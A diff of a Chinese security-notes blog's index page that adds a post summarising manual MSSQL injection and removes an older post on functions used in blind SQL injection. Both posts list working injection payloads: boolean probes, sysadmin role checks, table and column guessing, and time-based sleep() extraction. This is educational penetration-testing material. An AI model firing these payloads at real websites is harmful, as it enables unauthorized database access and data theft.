@@ -258,6 +258,227 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/03/MSSQL注入总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/03/MSSQL注入总结/" itemprop="url">
+                  MSSQL注入总结
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-03T15:29:52+08:00">
+                2018-05-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/笔记/" itemprop="url" rel="index">
+                    <span itemprop="name">笔记</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/03/MSSQL注入总结/" class="leancloud_visitors" data-flag-title="MSSQL注入总结">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前所有的sql注入类型的博客都以mysql数据库为例子的，但是在最近实际的渗透测试中有时会遇到一些MSSQL的数据库，所以对MSSQL注入进行一次总结。</p>
+<h2 id="0x01-MSSQL"><a href="#0x01-MSSQL" class="headerlink" title="0x01 MSSQL"></a>0x01 MSSQL</h2><p>ms SQL是指微软的SQLServer数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。</p>
+<h2 id="0x02-MSSQL手工注入技巧"><a href="#0x02-MSSQL手工注入技巧" class="headerlink" title="0x02 MSSQL手工注入技巧"></a>0x02 MSSQL手工注入技巧</h2><h4 id="1-判断是否有注入"><a href="#1-判断是否有注入" class="headerlink" title="1.判断是否有注入"></a>1.判断是否有注入</h4><ul>
+<li>?id=1</li>
+<li>?id=1’</li>
+<li>?id=1 and 1=1</li>
+<li>?id=1 and 1=2</li>
+</ul>
+<h4 id="2-判断是否是mssql"><a href="#2-判断是否是mssql" class="headerlink" title="2.判断是否是mssql"></a>2.判断是否是mssql</h4><ul>
+<li>?id=1 and user&gt;0</li>
+</ul>
+<h4 id="3-判断数据库系统"><a href="#3-判断数据库系统" class="headerlink" title="3.判断数据库系统"></a>3.判断数据库系统</h4><ul>
+<li>?id=1 and (select count(*) from sysobjects)&gt;0　　 mssql</li>
+<li>?id=1 and (select count(*) from msysobjects)&gt;0　　access</li>
+</ul>
+<h4 id="4-查询当前用户数据信息"><a href="#4-查询当前用户数据信息" class="headerlink" title="4.查询当前用户数据信息"></a>4.查询当前用户数据信息</h4><ul>
+<li>?id=1 having 1=1–</li>
+</ul>
+<h4 id="5-猜表名"><a href="#5-猜表名" class="headerlink" title="5.猜表名"></a>5.猜表名</h4><ul>
+<li>?id=1 and exists(select * from tablename)</li>
+<li>?id=1 and (Select Count(*) from [表名])&gt;0</li>
+</ul>
+<h4 id="6-猜字段"><a href="#6-猜字段" class="headerlink" title="6.猜字段"></a>6.猜字段</h4><ul>
+<li>?id=1 and (Select Count(字段名) from 表名)&gt;0</li>
+</ul>
+<h4 id="7-暴当前表中的列"><a href="#7-暴当前表中的列" class="headerlink" title="7.暴当前表中的列"></a>7.暴当前表中的列</h4><ul>
+<li>?id=1 group by admin.username having 1=1–</li>
+</ul>
+<h4 id="8-猜字段中记录长度"><a href="#8-猜字段中记录长度" class="headerlink" title="8.猜字段中记录长度"></a>8.猜字段中记录长度</h4><ul>
+<li>?id=1 and (select top 1 len(字段名) from 表名)&gt;0</li>
+</ul>
+<h4 id="9-猜字段中的ascii值"><a href="#9-猜字段中的ascii值" class="headerlink" title="9.猜字段中的ascii值"></a>9.猜字段中的ascii值</h4><ul>
+<li>?id=1 and (select top 1 asc(mid(字段名,1,1)) from 表名)&gt;0   access</li>
+<li>?id=1 and (select top 1 unicode(substring(字段名,1,1)) from 数据库名)&gt;0   mssql</li>
+</ul>
+<h4 id="10-测试权限结构（mssql）"><a href="#10-测试权限结构（mssql）" class="headerlink" title="10.测试权限结构（mssql）"></a>10.测试权限结构（mssql）</h4><ul>
+<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘sysadmin’));–</li>
+<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘serveradmin’));–</li>
+<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘setupadmin’));–</li>
+<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘securityadmin’));–</li>
+<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘diskadmin’));–</li>
+<li>?id=1 and 1=(SELECT IS_SRVROLEMEMBER(‘bulkadmin’));–</li>
+<li>?id=1 and 1=(SELECT IS_MEMBER(‘db_owner’));–</li>
+</ul>
+<h4 id="11-mssql内置函数"><a href="#11-mssql内置函数" class="headerlink" title="11.mssql内置函数"></a>11.mssql内置函数</h4><ul>
+<li>?id=1 and (select @@version)&gt;0　　　获得Windows的版本号</li>
+<li>?id=1 and user_name()=’dbo’　　　　 判断当前系统的连接用户是不是sa</li>
+<li>?id=1 and (select user_name())&gt;0　　爆当前系统的连接用户</li>
+<li>?id=1 and (select db_name())&gt;0　　　得到当前连接的数据库</li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/01/解析漏洞总结/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2190,253 +2411,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/21/sql注入盲注时常用函数/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/04/21/sql注入盲注时常用函数/" itemprop="url">
-                  sql注入盲注时常用函数
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-04-21T17:40:07+08:00">
-                2018-04-21
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/04/21/sql注入盲注时常用函数/" class="leancloud_visitors" data-flag-title="sql注入盲注时常用函数">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-盲注"><a href="#0x00-盲注" class="headerlink" title="0x00 盲注"></a>0x00 盲注</h2><p>盲注是不能通过直接显示的途径来获取数据库数据的方法，在盲注中，攻击者根据其返回页面的不同来判断信息。盲注一般可分为三类：Booleanbase<br>、Timebase、Errorbase。</p>
-<p>接下来介绍一些sql盲注中常用的函数。</p>
-<h2 id="0x01-limit"><a href="#0x01-limit" class="headerlink" title="0x01 limit()"></a>0x01 limit()</h2><p>limit()函数的作用是限制由SELECT语句返回的数据数量，用法是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, columnN </span><br><span class="line">FROM table_name</span><br><span class="line">LIMIT [no of rows]</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit 2,1;   //从第三行开始提取一行</span><br></pre></td></tr></table></figure>
-<p>其中各参数意义如下：</p>
-<ul>
-<li>column : 必要参数，要查询的字段名，可以同时查询多个。</li>
-<li>table_name : 必要参数，要查询的表名。</li>
-<li>no of rows : limit之后的第一个数字代表行数（从0开始算）后面数字代表从这行要返回的行数。</li>
-</ul>
-<p>和offset同时用时用法如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT column1, column2, columnN </span><br><span class="line">FROM table_name</span><br><span class="line">LIMIT [no of rows] OFFSET [row num]</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user limit 1 offset 2   //从第三行开始提取一行</span><br></pre></td></tr></table></figure>
-<p>其中各参数意义如下：</p>
-<ul>
-<li>no of rows : 取到的行数。</li>
-<li>row num : 起始位置（从0开始算）</li>
-</ul>
-<h2 id="0x02-mid"><a href="#0x02-mid" class="headerlink" title="0x02 mid()"></a>0x02 mid()</h2><p>mid()函数的作用是截取字符串的一部分，用法是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(column_name,start[,length])</span><br></pre></td></tr></table></figure></p>
-<p>其中各参数的意义如下：</p>
-<ul>
-<li>column_name ： 必要参数，要提取字符的字段。</li>
-<li>start : 必要参数，规定提取的起始位置，从1开始。</li>
-<li>length : 可选参数，要返回的字符长度，如果省略会返回剩余的全部文本。</li>
-</ul>
-<p>如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(database(),1,1)</span><br></pre></td></tr></table></figure></p>
-<p>返回数据库名的第一位。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid(database(),1,1)&gt;&apos;a&apos;</span><br></pre></td></tr></table></figure></p>
-<p>返回数据库名的第一位并与a的ascii作比较。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mid((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x76657374 LIMIT 0,1),1,1)</span><br></pre></td></tr></table></figure>
-<p>查找test数据库的第一个表名并提取表名的第一位。</p>
-<h2 id="0x03-substr-、substring"><a href="#0x03-substr-、substring" class="headerlink" title="0x03 substr()、substring()"></a>0x03 substr()、substring()</h2><p>substr()、substring()函数的作用也是截取字符串，用法同mid()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">substring(string, start, length)</span><br><span class="line">substr(string, start, length)</span><br></pre></td></tr></table></figure></p>
-<p>其中各参数意义如下：</p>
-<ul>
-<li>string ： 必要参数，要提取字符的字段。</li>
-<li>start : 必要参数，规定提取的起始位置，从1开始。</li>
-<li>length : 可选参数，要返回的字符长度，如果省略会返回剩余的全部文本。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr(DATABASE(),2,1)&gt;&apos;a&apos;</span><br></pre></td></tr></table></figure>
-<p>返回数据库名的第二位并与a的ascii作比较。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=0x76657374 LIMIT 0,1),1,1)&gt;&apos;a&apos;</span><br></pre></td></tr></table></figure>
-<p>查找test数据库的第一个表名并提取表名的第一位,然后有a的ascii作比较。</p>
-<h2 id="0x04-left"><a href="#0x04-left" class="headerlink" title="0x04 left()"></a>0x04 left()</h2><p>left()函数的作用是得到字符串左部开始指定个数的字符。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(string,n)</span><br></pre></td></tr></table></figure>
-<p>其中各参数意义如下：</p>
-<ul>
-<li>string ： 必要参数，要截取的字符串。</li>
-<li>n : 必要参数，规定截取的长度，从1开始。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left(database(),1)&gt;&apos;a&apos;</span><br></pre></td></tr></table></figure>
-<p>查看数据库名的第一位并和a的ascii作比较。</p>
-<h2 id="0x05-ord"><a href="#0x05-ord" class="headerlink" title="0x05 ord()"></a>0x05 ord()</h2><p>ord()函数的作用是返回字符串中第一个字符的ASCII值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(string)</span><br></pre></td></tr></table></figure></p>
-<p>其中各参数意义如下：</p>
-<ul>
-<li>string ： 必要参数，要获取的字符串。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ord(mid(user(),1,1))=114</span><br></pre></td></tr></table></figure>
-<p>检测user()的第一个字符是否等于114，即是否等于r，一般用来判断是否是root权限。</p>
-<h2 id="0x06-sleep"><a href="#0x06-sleep" class="headerlink" title="0x06 sleep()"></a>0x06 sleep()</h2><p>sleep()函数的作用是让代码执行延迟若干秒。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep(seconds)</span><br></pre></td></tr></table></figure></p>
-<p>其中各参数意义如下：</p>
-<ul>
-<li>seconds ： 必要参数，延迟的秒数。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(ascii(substr(database(),1,1))&gt;&apos;a&apos;,1,sleep(5))#</span><br></pre></td></tr></table></figure>
-<p>检测数据库的第一个字符的ascii和a比较，如果浏览器直接显示，说明比a大，如果浏览器五秒后才显示，说明比a小。</p>
-<h2 id="0x07-benchmark"><a href="#0x07-benchmark" class="headerlink" title="0x07 benchmark()"></a>0x07 benchmark()</h2><p>benchmark()函数的作用是重复执行指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">benchmark(count,expr)</span><br></pre></td></tr></table></figure></p>
-<p>其中各参数意义如下：</p>
-<ul>
-<li>count ： 必要参数，重复的次数。</li>
-<li>expr : 必要参数，执行的语句。</li>
-</ul>
-<h2 id="0x08-grunp-concat"><a href="#0x08-grunp-concat" class="headerlink" title="0x08 grunp_concat()"></a>0x08 grunp_concat()</h2><p>grunp_concat()函数的作用是连接字段字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_concat([DISTINCT] name [Order BY ASC/DESC 排序字段] [Separator &apos;分隔符&apos;])</span><br></pre></td></tr></table></figure></p>
-<p>其中各参数意义如下：</p>
-<ul>
-<li>name : 要连接的字段</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),1,1)=105</span><br></pre></td></tr></table></figure>
-<h2 id="0x09-总结"><a href="#0x09-总结" class="headerlink" title="0x09 总结"></a>0x09 总结</h2><p>盲注是sql注入中十分常用的手段，而且盲注很多时候需要写脚本来实现，熟悉这些函数，结合前面的绕过方法，会让自己的脚本更加灵活。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2486,7 +2460,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">84</span>
+                <span class="site-state-item-count">85</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
